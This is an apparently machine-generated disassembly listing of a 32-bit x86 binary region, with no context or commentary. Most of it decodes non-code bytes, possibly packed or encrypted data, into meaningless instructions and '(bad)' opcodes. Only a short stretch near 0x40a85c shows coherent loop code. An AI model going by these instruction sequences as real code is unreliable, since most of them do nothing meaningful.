  40a5e9:	fcmovb st,st(6)
  40a5eb:	xchg   esp,eax
  40a5ec:	arpl   WORD PTR [edx-0x10],si
  40a5ef:	sub    BYTE PTR [ebx+0x57a7abbf],0xa7
  40a5f6:	arpl   WORD PTR [eax+0x78],si
  40a5f9:	push   edx
  40a5fa:	call   FWORD PTR [esi+ebp*2]
  40a5fd:	cli    
  40a5fe:	popf   
  40a5ff:	mov    cl,0x27
  40a601:	jae    0x40a657
  40a603:	aaa    
  40a604:	dec    ebp
  40a605:	fimul  WORD PTR [ecx+eax*1]
  40a608:	xor    bl,BYTE PTR cs:[esi]
  40a60b:	shl    ecx,0xbb
  40a60e:	xchg   bh,dh
  40a610:	push   eax
  40a611:	push   eax
  40a612:	and    esi,esi
  40a614:	sub    dl,BYTE PTR [edx]
  40a616:	or     eax,0xfeb96b11
  40a61b:	and    bh,BYTE PTR [eax]
  40a61d:	xchg   edx,eax
  40a61f:	fsub   st,st(4)
  40a621:	adc    eax,0x9939f351
  40a626:	jne    0x40a5f4
  40a628:	inc    ecx
  40a629:	aas    
  40a62a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a62c:	jb     0x40a68e
  40a62e:	add    eax,DWORD PTR [eax+0xf]
  40a631:	(bad)  
  40a632:	mov    fs,WORD PTR [ebx-0xc692cfb]
  40a638:	in     eax,0x40
  40a63a:	stc    
  40a63b:	les    ebx,FWORD PTR [edi+0xe]
  40a63e:	dec    esp
  40a63f:	pop    ecx
  40a640:	cmp    BYTE PTR [edx+0x4a],bl
  40a643:	sub    DWORD PTR [edx+ebp*8+0x734f455d],0x55
  40a64b:	loopne 0x40a5e2
  40a64d:	ret    
  40a64e:	gs jmp 0xd418fa01
  40a654:	(bad)  
  40a655:	jae    0x40a5db
  40a657:	mov    ebx,0xa1b3e644
  40a65c:	pop    esp
  40a65d:	push   edx
  40a65e:	out    0x38,al
  40a660:	mov    al,0x49
  40a662:	adc    al,0x22
  40a664:	rol    BYTE PTR [ecx-0x1129fb4],cl
  40a66a:	mov    ebx,0xd7814d7d
  40a66f:	retf   
  40a670:	aaa    
  40a671:	xchg   ebp,eax
  40a672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a673:	push   eax
  40a674:	or     bl,BYTE PTR [esp+ecx*1+0x3d]
  40a678:	test   BYTE PTR [edx+0x28ea8bbc],al
  40a67e:	arpl   WORD PTR [eax+ebx*8-0x197dce40],sp
  40a685:	jg     0x40a654
  40a687:	mov    ds:0x2101b8dd,al
  40a68c:	jns    0x40a642
  40a68e:	xchg   edx,eax
  40a68f:	int3   
  40a690:	sub    dh,bh
  40a692:	mov    BYTE PTR [esi+0x1e4748f1],cl
  40a698:	aad    0x31
  40a69a:	inc    edx
  40a69b:	push   ebp
  40a69c:	call   0x4fb1:0x72869e67
  40a6a3:	sub    eax,0xfd2d5042
  40a6a8:	div    DWORD PTR [edx]
  40a6aa:	and    al,BYTE PTR [edi-0x57]
  40a6ad:	fld    st(2)
  40a6af:	(bad)  [esp+eax*1-0x29]
  40a6b3:	outs   dx,DWORD PTR ds:[esi]
  40a6b4:	arpl   WORD PTR [esi+0x7a],di
  40a6b7:	sbb    DWORD PTR [eax],0x120251b8
  40a6bd:	in     al,dx
  40a6be:	xor    DWORD PTR [ebp-0xc],ebx
  40a6c1:	dec    ecx
  40a6c2:	outs   dx,DWORD PTR ds:[esi]
  40a6c3:	das    
  40a6c4:	aaa    
  40a6c5:	pop    esp
  40a6c6:	loopne 0x40a723
  40a6c8:	les    edx,FWORD PTR [esp+edi*8+0x4e77dfa7]
  40a6cf:	shl    BYTE PTR [eax],cl
  40a6d1:	xlat   BYTE PTR ds:[ebx]
  40a6d2:	and    ebx,DWORD PTR [edi-0x6a]
  40a6d5:	pop    ebx
  40a6d6:	sar    dl,cl
  40a6d8:	jge    0x40a6b1
  40a6da:	out    dx,eax
  40a6db:	inc    ebx
  40a6dc:	stos   BYTE PTR es:[edi],al
  40a6dd:	pop    ds
  40a6de:	shl    ah,0x57
  40a6e1:	xlat   BYTE PTR ds:[ebx]
  40a6e2:	test   eax,0xbe291e3b
  40a6e7:	jmp    0x40a708
  40a6e9:	neg    BYTE PTR [esi]
  40a6eb:	push   ds
  40a6ec:	push   ss
  40a6ed:	(bad)  
  40a6ee:	retf   
  40a6ef:	cmp    esi,DWORD PTR ds:0xe19ec8ef
  40a6f5:	pop    esi
  40a6f6:	cmp    BYTE PTR [esi+0x34262934],0x1f
  40a6fd:	push   es
  40a6fe:	mov    esp,0x1b9a6cb0
  40a703:	in     al,0x3e
  40a705:	mov    ebp,0xac8afa54
  40a70a:	stc    
  40a70b:	cmc    
  40a70c:	mov    ebp,0x4874dcb4
  40a711:	call   0x2c8daa15
  40a716:	popa   
  40a717:	adc    al,0x62
  40a719:	jo     0x40a790
  40a71b:	inc    esp
  40a71c:	adc    DWORD PTR [ecx+0x4c],ecx
  40a71f:	clc    
  40a720:	aad    0x37
  40a722:	ret    
  40a723:	jle    0x913fde0f
  40a729:	lods   eax,DWORD PTR ds:[esi]
  40a72a:	pop    ebx
  40a72b:	dec    ebx
  40a72c:	mov    ds:0x9d727e06,eax
  40a731:	add    al,0x93
  40a733:	or     BYTE PTR [esi+0x3f],ah
  40a736:	scas   al,BYTE PTR es:[edi]
  40a737:	test   eax,0xb3d94a0a
  40a73c:	loopne 0x40a6d6
  40a73e:	cmc    
  40a73f:	or     bl,BYTE PTR [ebp+0x26c8ac57]
  40a745:	sub    DWORD PTR [esi+0x2d37cc1e],0xffffff97
  40a74c:	xchg   DWORD PTR [ebp+eax*8+0x3a41a308],ebx
  40a753:	icebp  
  40a754:	pop    ds
  40a755:	xor    bh,BYTE PTR [esi]
  40a757:	ss jmp 0x40a74e
  40a75a:	popa   
  40a75b:	inc    ebp
  40a75c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40a75e:	and    eax,DWORD PTR ds:0xab222ed1
  40a764:	aam    0xf6
  40a766:	add    bh,BYTE PTR [edx+edi*1]
  40a769:	mov    edi,0xcb612df1
  40a76e:	(bad)  
  40a76f:	in     al,dx
  40a770:	or     DWORD PTR [bp+0x2a],ecx
  40a774:	dec    ebp
  40a775:	add    al,0xef
  40a777:	and    ebx,0x122477ec
  40a77d:	push   esp
  40a77e:	mov    bl,0xe6
  40a780:	pop    ebp
  40a781:	and    BYTE PTR [edx-0x3f],bh
  40a784:	hlt    
  40a785:	and    al,0xd2
  40a787:	adc    ecx,DWORD PTR [ebx-0x251858a2]
  40a78d:	jns    0x40a79d
  40a78f:	scas   al,BYTE PTR es:[edi]
  40a790:	fldcw  WORD PTR [ebx-0x29]
  40a793:	test   eax,0x7e115a8e
  40a798:	pop    edi
  40a799:	push   0x17
  40a79b:	jg     0x40a7b5
  40a79d:	xchg   edx,eax
  40a79e:	pop    ecx
  40a79f:	mov    BYTE PTR [edi+ebp*1],dl
  40a7a2:	and    al,BYTE PTR [ebx-0x213d0234]
  40a7a8:	pop    edx
  40a7a9:	aaa    
  40a7aa:	sbb    DWORD PTR [ecx-0x72],edi
  40a7ad:	mov    bl,0xcd
  40a7af:	pop    edi
  40a7b0:	add    BYTE PTR [ecx-0x68756904],0xf9
  40a7b7:	cmp    DWORD PTR [ebx-0x1a77e885],edx
  40a7bd:	mov    bh,0x48
  40a7bf:	iret   
  40a7c0:	xrelease mov DWORD PTR gs:[esi+0xa],edi
  40a7c5:	xlat   BYTE PTR ds:[ebx]
  40a7c6:	aas    
  40a7c7:	test   eax,0x10f1011c
  40a7cc:	lea    edx,[edi]
  40a7ce:	jecxz  0x40a7a5
  40a7d0:	mov    bh,BYTE PTR [esi-0x43fad67f]
  40a7d6:	fadd   st(3),st
  40a7d8:	mov    WORD PTR [edi+0x4c419c6a],?
  40a7de:	ss mov al,0x88
  40a7e1:	push   ebx
  40a7e2:	fs pop esp
  40a7e4:	mov    ch,0x7
  40a7e6:	in     al,dx
  40a7e7:	push   esi
  40a7e8:	xchg   cl,ah
  40a7ea:	jl     0x40a81c
  40a7ec:	clc    
  40a7ed:	xchg   edx,eax
  40a7ee:	aaa    
  40a7ef:	push   edx
  40a7f0:	retf   
  40a7f1:	loope  0x40a7ec
  40a7f3:	fdivr  DWORD PTR [ecx+0x63]
  40a7f6:	ror    BYTE PTR [ecx-0x34],0xb6
  40a7fa:	imul   dl
  40a7fc:	int3   
  40a7fd:	inc    edx
  40a7fe:	inc    edi
  40a7ff:	sbb    BYTE PTR [edi+0x2ff234b0],al
  40a805:	push   esp
  40a806:	push   esi
  40a807:	jl     0x40a80d
  40a809:	std    
  40a80a:	jle    0x40a7da
  40a80c:	pushf  
  40a80d:	test   edi,0xe9fbe72e
  40a813:	outs   dx,BYTE PTR ds:[esi]
  40a814:	call   0xc114277e
  40a819:	ror    BYTE PTR [esi+0x34],cl
  40a81c:	gs call 0x19c29ba1
  40a822:	or     al,0xe3
  40a824:	push   edi
  40a825:	mov    bh,0x9e
  40a827:	adc    BYTE PTR [ebx-0x45],dh
  40a82a:	(bad)  
  40a82c:	lods   al,BYTE PTR ds:[esi]
  40a82d:	mov    cl,0x1b
  40a82f:	push   0xc4e1e25b
  40a834:	xchg   ecx,eax
  40a835:	jecxz  0x40a810
  40a837:	stos   DWORD PTR es:[edi],eax
  40a838:	adc    ah,ah
  40a83a:	rcl    DWORD PTR [eax+0x1a1f1b6f],cl
  40a840:	push   esi
  40a841:	xchg   ecx,eax
  40a842:	jg     0x40a86f
  40a844:	ins    BYTE PTR es:[edi],dx
  40a845:	scas   al,BYTE PTR es:[edi]
  40a846:	xor    al,0xfe
  40a848:	xchg   DWORD PTR ds:0x8d2d79fe,esp
  40a84e:	inc    ebp
  40a84f:	call   0x821ceddd
  40a854:	xor    eax,0x4302dd
  40a859:	adc    ebx,DWORD PTR [edi+0x0]
  40a85c:	add    BYTE PTR [ebx+0x2581e845],cl
  40a862:	jmp    0x40eb69
  40a867:	add    BYTE PTR [eax],al
  40a869:	add    cl,ch
  40a86b:	or     eax,0x8b000000
  40a870:	sbb    eax,0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx+0x1a8a4f79],bl
  40a93e:	xlat   BYTE PTR ds:[ebx]
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a93b
  40a948:	dec    edi
  40a949:	dec    bx
  40a94b:	test   eax,0xa548d8d1
  40a950:	imul   edx,DWORD PTR [ebx],0x32b3f8c3
  40a956:	xchg   edx,eax
  40a957:	les    eax,FWORD PTR [edx-0x211124cd]
  40a95d:	les    esp,FWORD PTR [ebx+0x23]
  40a960:	mov    eax,ds:0xbb89361f
  40a965:	mov    al,ds:0x6d01b863
  40a96a:	mov    ecx,0x6f239ac3
  40a96f:	int3   
  40a970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a971:	dec    ecx
  40a972:	(bad)  [edi*2+0xc3876f1]
  40a979:	pop    esp
  40a97a:	lea    eax,[ecx]
  40a97c:	cmp    ecx,DWORD PTR [ecx+eiz*1+0xb73f59d]
  40a983:	sbb    DWORD PTR [esi+eax*1],esp
  40a986:	jns    0x40a94c
  40a988:	cld    
  40a989:	dec    esp
  40a98a:	push   esp
  40a98b:	data16 int3 
  40a98d:	scas   al,BYTE PTR es:[edi]
  40a98e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40a990:	mov    al,0xda
  40a992:	push   ebp
  40a993:	(bad)  
  40a994:	cld    
  40a995:	xlat   BYTE PTR ds:[ebx]
  40a996:	cmovns edi,edx
  40a999:	cmp    esi,DWORD PTR [ecx+ebp*1]
  40a99c:	mov    dl,0xd4
  40a99e:	imul   al
  40a9a0:	call   0xc47692ca
  40a9a5:	jecxz  0x40a94f
  40a9a7:	and    esi,DWORD PTR [eax+0x39b2cf04]
  40a9ad:	mov    ah,BYTE PTR [eax-0x614baf72]
  40a9b3:	cmc    
  40a9b4:	jae    0x40a9c6
  40a9b6:	cmp    BYTE PTR [ebp-0x21],bl
  40a9b9:	xchg   esi,eax
  40a9ba:	pop    ss
  40a9bb:	push   eax
  40a9bc:	cmp    DWORD PTR [eax],eax
  40a9be:	or     esp,DWORD PTR [edi+0x76518077]
  40a9c4:	push   esi
  40a9c5:	xchg   esp,eax
  40a9c6:	xor    dh,cl
  40a9c8:	cld    
  40a9c9:	sar    BYTE PTR [esi+eax*8+0x630ecb8a],1
  40a9d0:	sbb    dl,bl
  40a9d2:	inc    edx
  40a9d3:	gs mov edx,0xf277a409
  40a9d9:	mov    eax,DWORD PTR [edi+0x52]
  40a9dc:	inc    edi
  40a9dd:	cld    
  40a9de:	ss (bad) 
  40a9e0:	rcl    DWORD PTR [eax+0x0],cl
  40a9e3:	mov    dl,0xd
  40a9e5:	data16 je 0x40aa51
  40a9e8:	ret    0x288e
  40a9eb:	aas    
  40a9ec:	out    0x3f,al
  40a9ee:	cld    
  40a9ef:	int3   
  40a9f0:	aad    0x12
  40a9f2:	lods   eax,DWORD PTR ds:[esi]
  40a9f3:	or     ah,ch
  40a9f5:	jecxz  0x40aa58
  40a9f7:	mov    dh,0xcf
  40a9f9:	mov    bh,0xe1
  40a9fb:	sub    eax,0xa2501d0e
  40aa00:	ds retf 0xbc9a
  40aa04:	jmp    0x40aa82
  40aa06:	inc    esi
  40aa07:	add    eax,0x672d7875
  40aa0c:	mov    edi,0x4fd84324
  40aa11:	inc    ebp
  40aa12:	mov    ds:0x821804c7,eax
  40aa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa18:	cli    
  40aa19:	leave  
  40aa1a:	adc    eax,0x5ec28ce3
  40aa1f:	jmp    0x29e4:0x13c1dcf5
  40aa26:	cmp    al,0x3a
  40aa28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa29:	jecxz  0x40aa2a
  40aa2b:	cmp    eax,0x6dc85945
  40aa30:	jmp    0x40aa25
  40aa32:	mov    ecx,0x11c91c27
  40aa37:	dec    eax
  40aa38:	icebp  
  40aa39:	and    eax,0x3fce370d
  40aa3e:	mov    ds:0x1de74631,eax
  40aa43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa44:	or     DWORD PTR [edx-0x570ea1a4],ecx
  40aa4a:	gs push ebx
  40aa4c:	pop    esp
  40aa4d:	adc    BYTE PTR [ecx],0xbd
  40aa50:	dec    ebx
  40aa51:	mov    bl,0xf2
  40aa53:	(bad)  
  40aa54:	test   eax,0x3a0d98c9
  40aa59:	add    BYTE PTR [esi-0x1a],ch
  40aa5c:	sbb    dh,BYTE PTR ds:0x9a6dfb6f
  40aa62:	mov    ds:0x89b67334,eax
  40aa67:	sub    DWORD PTR [esi-0x38],edi
  40aa6a:	loop   0x40aa40
  40aa6c:	mov    bl,0xb4
  40aa6e:	popa   
  40aa6f:	xchg   edx,eax
  40aa70:	test   cl,ch
  40aa72:	int3   
  40aa73:	es pop eax
  40aa75:	popa   
  40aa76:	lods   al,BYTE PTR ds:[esi]
  40aa77:	mov    esi,DWORD PTR [esp+ebx*1]
  40aa7a:	adc    DWORD PTR [ebx-0x39dcb8e3],0xaccb052f
  40aa84:	mov    dh,0xf5
  40aa86:	dec    DWORD PTR [edx+0x6e]
  40aa89:	ret    0xc155
  40aa8c:	sbb    dh,BYTE PTR [ebp+0x9b0cae9]
  40aa92:	adc    ecx,0xffffffa8
  40aa95:	jge    0x40aadb
  40aa97:	jne    0x40ab09
  40aa99:	ds sub esp,ecx
  40aa9c:	pop    ebp
  40aa9d:	jnp    0x40aae6
  40aa9f:	je     0x40aad1
  40aaa1:	mov    ah,0xae
  40aaa3:	cli    
  40aaa4:	jb     0x40aada
  40aaa6:	scas   al,BYTE PTR es:[edi]
  40aaa7:	mov    ss,WORD PTR [eax]
  40aaa9:	dec    edx
  40aaaa:	imul   ecx,DWORD PTR [ebx-0x76],0xffffffd5
  40aaae:	sbb    eax,0x929978a8
  40aab3:	jmp    0x3f8a:0xab73c911
  40aaba:	ja     0x40aa7d
  40aabc:	nop
  40aabd:	repz les esp,FWORD PTR [esi]
  40aac0:	mov    ds:0x5e48692c,al
  40aac5:	icebp  
  40aac6:	inc    ebx
  40aac7:	aam    0x78
  40aac9:	ja     0x40aa5c
  40aacb:	scas   al,BYTE PTR es:[edi]
  40aacc:	dec    esi
  40aacd:	imul   ebp,DWORD PTR ds:0xd8c08745,0xf67428e5
  40aad7:	sub    cl,ch
  40aad9:	mov    fs,WORD PTR gs:[ebx+0x72]
  40aadd:	repnz mov ds:0x6332b452,al
  40aae3:	fild   DWORD PTR [esi+eax*2+0xa]
  40aae7:	add    al,0x17
  40aae9:	adc    DWORD PTR [ebp+0x59],edx
  40aaec:	out    0x10,al
  40aaee:	cs aam 0xe
  40aaf1:	mov    ss,WORD PTR [ecx]
  40aaf3:	ficomp DWORD PTR [ebx+0x74]
  40aaf6:	mov    eax,ds:0xeefde00e
  40aafb:	adc    al,0x9d
  40aafd:	call   0xbe4:0x4dc11a77
  40ab04:	dec    edx
  40ab05:	adc    eax,0x80a022ce
  40ab0a:	shl    BYTE PTR [esi],cl
  40ab0c:	add    al,0x5b
  40ab0e:	cmp    bl,BYTE PTR [eax+0x31297f80]
  40ab14:	push   0xfbc45d61
  40ab19:	das    
  40ab1a:	ror    DWORD PTR [edi+ebp*8+0xe019692],0x84
  40ab22:	and    BYTE PTR [ecx],bh
  40ab24:	and    BYTE PTR [edi],cl
  40ab26:	add    esi,DWORD PTR [esi+0x77dd2aaf]
  40ab2c:	cmp    BYTE PTR ss:[ecx-0x6d],dl
  40ab30:	imul   eax,edi,0xd7c9501e
  40ab36:	fwait
  40ab37:	dec    ecx
  40ab38:	add    bh,cl
  40ab3a:	sti    
  40ab3b:	inc    eax
  40ab3c:	mov    edx,0x4ceea502
  40ab41:	ror    BYTE PTR [ecx-0x42],1
  40ab44:	mov    WORD PTR [esi],ss
  40ab46:	add    bl,BYTE PTR [edi-0x24]
  40ab49:	pminsw mm3,QWORD PTR [eax-0x38c6f2b9]
  40ab50:	sbb    ebp,DWORD PTR [ebp-0x176785b7]
  40ab56:	lea    edi,[edi+esi*2+0x2]
  40ab5a:	lock mov al,ds:0x116dcc65
  40ab60:	mov    esp,ebp
  40ab62:	xor    al,0xdc
  40ab64:	int3   
  40ab65:	aaa    
  40ab66:	jl     0x40ab6c
  40ab68:	aas    
  40ab69:	cmp    bl,al
  40ab6b:	jp     0x40ab26
  40ab6d:	xor    eax,0xf5b80c56
  40ab72:	inc    ebx
  40ab73:	(bad)  
  40ab74:	lods   al,BYTE PTR ds:[esi]
  40ab75:	jne    0x40ab84
  40ab77:	mov    ebp,DWORD PTR [ecx-0x2bc2566f]
  40ab7d:	jp     0x40abfa
  40ab7f:	push   esi
  40ab80:	mov    ds:0x2917acfe,al
  40ab85:	adc    BYTE PTR [eax+0x46],ah
  40ab88:	sub    al,0x6
  40ab8a:	xor    al,0x71
  40ab8c:	sar    BYTE PTR [esi-0x7a],0x48
  40ab90:	pusha  
  40ab91:	cwde   
  40ab92:	mul    BYTE PTR [edi+0xc]
  40ab95:	idiv   DWORD PTR [edi-0x372ec4fe]
  40ab9b:	push   ss
  40ab9c:	jne    0x40ab85
  40ab9e:	and    dl,BYTE PTR [eax-0x38e66612]
  40aba4:	das    
  40aba5:	fistp  DWORD PTR [eax]
  40aba7:	iret   
  40aba8:	mov    ecx,0xebc73700
  40abad:	pop    esp
  40abae:	lds    ecx,FWORD PTR [esi+0x3b]
  40abb1:	popf   
  40abb2:	hlt    
  40abb3:	sub    dh,bl
  40abb5:	shl    BYTE PTR [ecx-0x57e75c6d],1
  40abbb:	mov    ds:0xb9d78a20,al
  40abc0:	popa   
  40abc1:	mov    bh,0xdf
  40abc3:	das    
  40abc4:	adc    eax,0xee3b7e28
  40abc9:	pop    edi
  40abca:	sbb    al,0x98
  40abcc:	stc    
  40abcd:	xchg   si,ax
  40abcf:	jb     0x40ac46
  40abd1:	fst    DWORD PTR [edx-0xb14847]
  40abd7:	xchg   edx,eax
  40abd8:	ss in  al,0x66
  40abdb:	lahf   
  40abdc:	(bad)  
  40abde:	(bad)  
  40abdf:	(bad)  
  40abe0:	xor    dl,dl
  40abe2:	out    0x7b,al
  40abe4:	js     0x40abd2
  40abe6:	jecxz  0x40ac25
  40abe8:	adc    ebx,DWORD PTR [esi+0x42]
  40abeb:	push   esp
  40abec:	mov    esi,DWORD PTR [edi*2+0x25c79069]
  40abf3:	lods   eax,DWORD PTR ds:[esi]
  40abf4:	xchg   ecx,eax
  40abf5:	sbb    dh,BYTE PTR [ecx+0x85a5d7b]
  40abfb:	sub    BYTE PTR [eax],ah
  40abfd:	sub    al,BYTE PTR [ebx-0xa]
  40ac00:	std    
  40ac01:	(bad)  
  40ac02:	clc    
  40ac03:	cwde   
  40ac04:	mov    DWORD PTR [ecx],eax
  40ac06:	push   eax
  40ac07:	cwde   
  40ac08:	scas   al,BYTE PTR es:[edi]
  40ac09:	mov    ecx,ebp
  40ac0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac0c:	xchg   ebx,eax
  40ac0d:	adc    al,0x93
  40ac0f:	xlat   BYTE PTR ds:[ebx]
  40ac10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac11:	jb     0x40ac5d
  40ac13:	mov    ah,0x4c
  40ac15:	jne    0x40ac60
  40ac17:	sbb    eax,0xd977467d
  40ac1c:	or     bh,BYTE PTR [esi+0x37]
  40ac1f:	dec    ebx
  40ac20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac21:	xlat   BYTE PTR ds:[ebx]
  40ac22:	shr    DWORD PTR [ebx+0x75],1
  40ac25:	popf   
  40ac26:	mov    ah,0x2b
  40ac28:	jns    0x40ac59
  40ac2a:	inc    esp
  40ac2b:	xor    BYTE PTR [edi-0x1bca3e57],bh
  40ac31:	imul   ecx,DWORD PTR [edi-0x1c0f8254],0x3b
  40ac38:	jmp    0x40ac38
  40ac3a:	xchg   edi,eax
  40ac3b:	ds pop edi
  40ac3d:	sbb    DWORD PTR [esi-0x358be27b],0xffffffa0
  40ac44:	dec    edi
  40ac45:	push   ebp
  40ac46:	jecxz  0x40abe8
  40ac48:	mov    edi,0xb4c8badb
  40ac4d:	gs mov ecx,esp
  40ac50:	push   ebx
  40ac51:	push   cs
  40ac52:	les    edi,FWORD PTR [esi]
  40ac54:	test   BYTE PTR [esi],cl
  40ac56:	pop    edi
  40ac57:	dec    esi
  40ac58:	jns    0x40ac58
  40ac5a:	icebp  
  40ac5b:	outs   dx,DWORD PTR ds:[esi]
  40ac5c:	xor    eax,0x450459f5
  40ac61:	sbb    al,0x2b
  40ac63:	xbegin 0x23fbed7c
  40ac69:	cmc    
  40ac6a:	pop    ebx
  40ac6b:	push   edi
  40ac6c:	mov    eax,ds:0x93433250
  40ac71:	loope  0x40ac40
  40ac73:	mov    DWORD PTR [ebx+0x7ca1ab0e],esi
  40ac79:	and    al,BYTE PTR [ecx+0x0]
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	push   eax
  40ac93:	nop
  40ac94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac95:	xor    BYTE PTR [ecx-0x14],cl
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ad0f
  40ac9f:	or     DWORD PTR [esi+eax*8+0x243f21dd],0xffffffd8
  40aca7:	sub    edx,DWORD PTR [edx+0x7ab32f14]
  40acad:	ss inc ecx
  40acaf:	pop    es
  40acb0:	xor    ecx,DWORD PTR [eax]
  40acb2:	and    ecx,DWORD PTR [edi+0x73a805ae]
  40acb8:	push   edx
  40acb9:	aad    0x5d
  40acbb:	popf   
  40acbc:	cmp    al,0xc7
  40acbe:	pop    edx
  40acbf:	int3   
  40acc0:	cmp    al,0xa2
  40acc2:	inc    ecx
  40acc3:	pushf  
  40acc4:	mov    eax,ds:0x1f83afe
  40acc9:	inc    eax
  40accb:	ret    
  40accc:	sbb    bh,BYTE PTR [ebp-0x5a]
  40accf:	mov    cl,0x2c
  40acd1:	inc    ecx
  40acd2:	jne    0x40acc1
  40acd4:	loopne 0x40ad15
  40acd6:	add    ch,bl
  40acd8:	mov    eax,0x2ab089fc
  40acdd:	mov    edx,0x7d4efa49
  40ace2:	les    ebx,FWORD PTR [edx-0x44]
  40ace5:	imul   ecx,DWORD PTR ss:[edx+0x14],0x577fa6e1
  40aced:	repz jnp 0x40aca2
  40acf0:	ins    BYTE PTR es:[edi],dx
  40acf1:	push   esi
  40acf2:	push   ebp
  40acf3:	call   0x1f41:0xc56de2b7
  40acfa:	xor    esi,DWORD PTR [esi-0x1b]
  40acfd:	xlat   BYTE PTR ds:[ebx]
  40acfe:	loop   0x40acce
  40ad00:	pop    ds
  40ad01:	xor    al,0x18
  40ad03:	dec    edi
  40ad04:	aaa    
  40ad05:	mov    edi,0x7b7862e6
  40ad0a:	pop    ds
  40ad0b:	mov    eax,ds:0x7ac536c7
  40ad10:	push   ds
  40ad11:	fisub  WORD PTR [esi-0x3a]
  40ad14:	or     eax,DWORD PTR [edi-0x2d0794ae]
  40ad1a:	or     BYTE PTR [eax-0x58],cl
  40ad1d:	cdq    
  40ad1e:	mov    ecx,0xfa06c1fe
  40ad23:	xor    DWORD PTR ds:0x99994804,ebp
  40ad29:	rcr    esi,1
  40ad2b:	xor    bh,BYTE PTR [eax-0x7c]
  40ad2e:	pusha  
  40ad2f:	in     al,dx
  40ad30:	xchg   edi,eax
  40ad31:	or     edx,DWORD PTR [ebx]
  40ad33:	(bad)  
  40ad34:	rol    BYTE PTR [ebp-0x115fcffd],cl
  40ad3a:	pop    ss
  40ad3b:	enter  0xda0b,0x4
  40ad3f:	repz inc edx
  40ad41:	cwde   
  40ad42:	mov    DWORD PTR [esi+edi*4],ebx
  40ad45:	scas   al,BYTE PTR es:[edi]
  40ad46:	shr    DWORD PTR [esp+ebx*8+0xa],1
  40ad4a:	inc    ebp
  40ad4b:	mov    ah,0x63
  40ad4d:	(bad)  
  40ad4e:	or     eax,0x55cda1be
  40ad53:	sbb    BYTE PTR [edx-0xa1003d3],ch
  40ad59:	xchg   edi,ebp
  40ad5b:	ja     0x40adb1
  40ad5d:	add    DWORD PTR [eax+0x5d295b27],0xe61db1c
  40ad67:	fs inc edx
  40ad69:	loop   0x40adab
  40ad6b:	sub    bl,dl
  40ad6d:	xor    esp,DWORD PTR [ebp+0x1a]
  40ad70:	add    ebp,0x2ee9937
  40ad76:	pop    ebp
  40ad77:	adc    edx,DWORD PTR [ebx+0x32166ba5]
  40ad7d:	sub    BYTE PTR [edx-0x45b1fba7],al
  40ad83:	aam    0x3c
  40ad85:	add    eax,0x94a8e577
  40ad8a:	mov    bh,0x83
  40ad8c:	ss xchg ebx,eax
  40ad8e:	in     al,0xda
  40ad90:	pop    ebx
  40ad91:	icebp  
  40ad92:	adc    al,al
  40ad94:	je     0x40ad60
  40ad96:	(bad)  
  40ad97:	sbb    al,0xb6
  40ad99:	sub    esp,DWORD PTR [esi*1+0x3b83aa1]
  40ada0:	ror    ebp,1
  40ada2:	and    al,0xd1
  40ada4:	cdq    
  40ada5:	pop    ds
  40ada6:	retf   0xb2c2
  40ada9:	xor    esp,DWORD PTR [ebp-0xf39a2b9]
  40adaf:	call   0xd244:0xe0c2e2c1
  40adb6:	hlt    
  40adb7:	loopne 0x40ae0a
  40adb9:	and    DWORD PTR [edi+0x25],edi
  40adbc:	and    ebp,ebx
  40adbe:	imul   edx,DWORD PTR [esi-0x2a],0x740017e7
  40adc5:	cmp    al,BYTE PTR [eax]
  40adc7:	mov    cl,0xc8
  40adc9:	inc    eax
  40adca:	addr16 cmp bh,ah
  40adcd:	das    
